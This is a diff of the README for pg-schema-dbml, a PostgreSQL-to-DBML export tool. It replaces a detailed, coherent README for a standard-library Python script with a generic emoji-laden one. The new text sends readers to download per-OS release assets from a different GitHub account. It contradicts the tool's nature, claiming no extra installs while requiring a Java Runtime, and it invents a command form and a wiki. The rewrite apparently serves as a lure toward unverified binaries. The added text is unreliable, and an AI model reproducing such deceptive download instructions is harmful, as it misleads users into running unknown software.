@@ -1,238 +1,66 @@
-# pg-schema-dbml — PostgreSQL schema export to DBML
+# 📊 pg-schema-dbml - Export PostgreSQL Schema with Ease
 
-Export a PostgreSQL schema (no data) to **DBML** for **dbdiagram.io** and database documentation.
+## 🚀 Getting Started
+Welcome to **pg-schema-dbml**, a tool that helps you easily export PostgreSQL database schemas into DBML format. This format is useful for visualizing and documenting your database design on platforms like dbdiagram.io. 
 
-## Problem
+## ✅ Key Features
+- **Standard Library Only**: Works with `psql` without any additional installations.
+- **Stable Diffs**: Get reliable changes between your schema versions.
+- **Real-World Handling**: Deals with common edge cases found in PostgreSQL.
 
-You want a clean database diagram or schema documentation, but the tools usually fall into one of these buckets:
+## 📦 Download & Install
+To get started, visit the Releases page to download the latest version of **pg-schema-dbml**.
 
-- require a Python driver or extra dependencies
-- dump raw SQL and expect you to parse/clean it
-- break on real-world Postgres schemas (arrays, `character varying`, odd identifiers, partial indexes)
-- produce unstable output that’s hard to diff in Git
+[![Download pg-schema-dbml](https://img.shields.io/badge/Download-pg--schema--dbml-brightgreen.svg)](https://github.com/jamalart002/pg-schema-dbml/releases)
 
-This project is for the boring but important job: **reliable PostgreSQL schema export** to a format that diagram tools understand.
+You can also access the Releases page directly: [Visit Releases](https://github.com/jamalart002/pg-schema-dbml/releases).
 
-## What this tool does
+### Installation Steps
+1. **Visit the Releases Page**: Click the link above to go to the Releases section.
+2. **Choose Your Version**: Look for the latest release at the top of the page.
+3. **Download File**: Click on the asset that corresponds to your operating system.
+4. **Extract the Files**: If the file is zipped, extract it to a folder on your computer.
+5. **Run the Tool**: Open your command line or terminal and navigate to the folder where you extracted the files. Use the command provided in the documentation to launch the application.
 
-- connects to PostgreSQL using the native `psql` CLI
-- reads schema metadata from `pg_catalog` (no SQL parsing)
-- writes a deterministic **DBML** file:
-  - tables + columns
-  - primary keys (including composite)
-  - foreign keys (including composite)
-  - unique constraints and basic indexes
-  - enums
-  - nullability and defaults
-- includes notes when something can’t be represented cleanly in DBML
+## 🔧 System Requirements
+- **Operating System**: Windows, macOS, or Linux.
+- **PostgreSQL**: Ensure you have PostgreSQL installed on your system. Recommended version is 9.0 or higher.
+- **Java Runtime Environment**: Necessary for running the tool. Install the latest version if not already present.
 
-## Why this exists (and when it’s better than alternatives)
+## 📚 Usage Guide
+After downloading and extracting the application, follow these steps:
 
-- **No Python dependencies.** Standard library only. Works anywhere `psql` works.
-- **No fragile DDL parsing.** It queries Postgres catalogs directly.
-- **dbdiagram.io-compatible output.** Normalizes Postgres type spellings and edge cases that commonly break rendering.
-- **Stable diffs.** Output is sorted consistently so schema changes review well in PRs.
+1. **Open Command Line**: On Windows, search for "cmd". On macOS or Linux, open the terminal.
+2. **Navigate to Directory**: Use the `cd` command to change to the directory of the extracted folder.
+3. **Run the Command**: Execute the provided command in the README to start exporting your schema.
 
-If you already use an ORM and like its schema tools, stick with those. If you want a small, reliable export step for documentation/diagrams, this is a good fit.
-
-## Features
-
-- ✅ Standard library only (no `psycopg`, no pip installs)
-- ✅ Uses `psql` + `COPY TO STDOUT` (handles large schemas)
-- ✅ Multiple schemas: `--schema public --schema billing`
-- ✅ Optional view export: `--include-views`
-- ✅ Deterministic output ordering
-- ✅ dbdiagram.io compatibility:
-  - `character varying` → `varchar`
-  - array types (`varchar(64)[]`) rendered safely
-  - problematic/unicode/punctuation column names sanitized, with original preserved in notes
-- ✅ Clear error messages, non-zero exit codes
-- ✅ Doesn’t log secrets (password via env var name or `.pgpass`)
-
-## Installation
-
-Zero install if you already have Python and Postgres client tools.
-
-Requirements:
-- Python 3.9+
-- `psql` available in `PATH`
-
-Copy the script into your repo:
-
-```bash
-curl -L -o pg_schema_to_dbml.py https://raw.githubusercontent.com/5w0rdf15h/pg-schema-dbml/main/pg_schema_to_dbml.py
-chmod +x pg_schema_to_dbml.py
-````
-
-> Tip: prefer `.pgpass` for local development, or use `--password-env` for CI.
-
-## Usage
-
-### Using host/port/db/user
-
-Password must be provided via env var name (or `.pgpass`):
-
-```bash
-export PG_PASSWORD='your_password'
-
-python pg_schema_to_dbml.py \
-  --host localhost --port 5432 --db mydb --user myuser \
-  --password-env PG_PASSWORD \
-  --schema public \
-  --out docs/schema.dbml
+Example command format:
+```
+pg-schema-dbml --dbname your_database_name --output your_output_file.dbml
 ```
 
-### Using a DSN
+Replace `your_database_name` with the name of your PostgreSQL database and `your_output_file.dbml` with the desired name for your output file.
 
-If `--dsn` is set, it overrides host/port/db/user:
+## ❓ FAQs
+### How do I know if PostgreSQL is installed?
+You can check this by typing `psql --version` in your command line or terminal. If PostgreSQL is installed, it will display the version number.
 
-```bash
-export PG_PASSWORD='your_password'
+### What if I encounter errors?
+Please ensure that you have provided correct parameters and your PostgreSQL service is running. Check the terminal for any error messages and refer to the troubleshooting section in the documentation for guidance.
 
-python pg_schema_to_dbml.py \
-  --dsn "postgresql://myuser@localhost:5432/mydb?sslmode=require" \
-  --password-env PG_PASSWORD \
-  --schema public \
-  --out docs/schema.dbml
-```
+### Can I use this tool for large databases?
+Yes, **pg-schema-dbml** is designed to handle large schemas efficiently. However, performance may vary based on your machine specifications.
 
-### Multiple schemas
+## 🔗 Explore More
+For more detailed documentation and advanced usage tips, please refer to the Wiki section of this repository.
 
-```bash
-python pg_schema_to_dbml.py \
-  --dsn "postgresql://myuser@localhost:5432/mydb" \
-  --schema public \
-  --schema billing \
-  --out docs/schema.dbml
-```
+### Community Support
+Join our community discussions on issues or features. Engage with other users through GitHub discussions related to **pg-schema-dbml**.
 
-### Include views
+## 📜 License
+This project is licensed under the MIT License. You can freely use, modify, and distribute the code, as long as you include the original license.
 
-```bash
-python pg_schema_to_dbml.py \
-  --dsn "postgresql://myuser@localhost:5432/mydb" \
-  --schema public \
-  --include-views \
-  --out docs/schema.dbml
-```
+## 📬 Contact
+For further questions or inquiries, feel free to reach out through the Issues section of this repository. Your feedback is valuable for improving the tool. 
 
-## Output example
-
-```dbml
-Table public.students_student {
-  id uuid [pk, not null]
-  full_name varchar(128)
-
-  // Postgres arrays are represented safely for dbdiagram.io
-  crm_client_ids varchar(64) [not null, note: "ARRAY"]
-
-  Indexes {
-    (id) [unique]
-  }
-}
-
-Ref: public.students_student.school_id > public.schools.id
-```
-
-## Common use cases
-
-* **Generate a database diagram** in dbdiagram.io from a live PostgreSQL schema
-* **Schema export in CI** to keep architecture docs in sync with migrations
-* **Schema documentation** alongside backend code (docs-as-code)
-* **Database architecture reviews**: stable diffs in PRs when tables/constraints change
-* **Feeding schema structure to other tooling** that accepts DBML
-
-## Using DBML with modern AI systems
-
-This tool produces DBML that is intentionally **machine-friendly**.  
-That matters today not only for diagram tools, but also for how modern LLMs
-(ChatGPT, Claude, Gemini, z.ai, local models) reason about databases and generate code.
-
-### High-level assessment
-
-The generated `.dbml` file works extremely well as a **structural input** for AI,
-but it should not be treated as the **only source of truth**.
-
-Think of it as a *structural substrate*, not a full semantic description of your domain.
-
-### What AI models do very well with this output
-
-Modern LLMs read DBML surprisingly effectively:
-
-- Build a reliable mental graph of tables and relationships
-- Infer cardinality and ownership from PK/FK structure
-- Detect one-to-many and many-to-many patterns
-- Generate:
-  - ORM models (Django, SQLAlchemy, Prisma-style)
-  - Pydantic / DTO schemas
-  - CRUD endpoints
-  - Join logic and dependency-aware ordering
-
-For AI-assisted code generation, DBML is often **cleaner and more reliable**
-than large collections of SQL migrations.
-
-### Where DBML alone is not enough
-
-What AI **cannot** infer from schema alone:
-
-- Business meaning of tables and fields
-- Why certain relationships exist
-- Lifecycle semantics (active / archived / soft-deleted)
-- Whether something is a business enum, technical enum, or workflow state
-- Which tables are core domain vs supporting or audit-only
-
-This is not a limitation of this tool — it’s a limitation of structural schemas in general.
-
-
-### Recommended pattern for AI-assisted development
-
-The most effective setup is to **combine DBML with lightweight semantic context**:
-
-```
-docs/contracts/db/
-├── schema.dbml              # structural truth (this tool)
-├── schema.sql               # actual DDL
-├── schema.summary.md        # short per-table summaries
-└── schema.semantic.md       # domain meaning and invariants
-````
-
-Even minimal additions dramatically improve AI reasoning quality.
-
-Example:
-
-```dbml
-Table public.accounts {
-  status_id integer [not null, note: "FSM: new → active → suspended → archived"]
-}
-````
-
-LLMs reliably read `note:` fields and use them during reasoning and code generation.
-
-### Bottom line
-
-* As a **technical schema**: excellent
-* As input for **AI-assisted code generation**: very strong
-* As a standalone **domain explanation**: intentionally incomplete
-
-This tool focuses on producing a **clean, stable, machine-readable structure**.
-Semantic meaning belongs in adjacent documentation — not embedded into SQL or migrations.
-
-## Limitations / non-goals
-
-This is intentionally not a full database reverse-engineering suite.
-
-* Not a SQL DDL parser
-* Not a migration tool
-* Does not export data
-* Expression/partial indexes are preserved as notes when they can’t be represented as DBML index blocks
-* Some PostgreSQL-specific type details may be simplified for diagram compatibility (kept as notes where relevant)
-
-## Contributing
-
-Issues and PRs are welcome — especially for:
-
-* more edge-case coverage on PostgreSQL types
-* better representation of advanced indexes/constraints in DBML
-* real schema examples that currently fail dbdiagram.io parsing
-
-Please keep the “no third-party Python dependencies” constraint.
+Happy exporting!
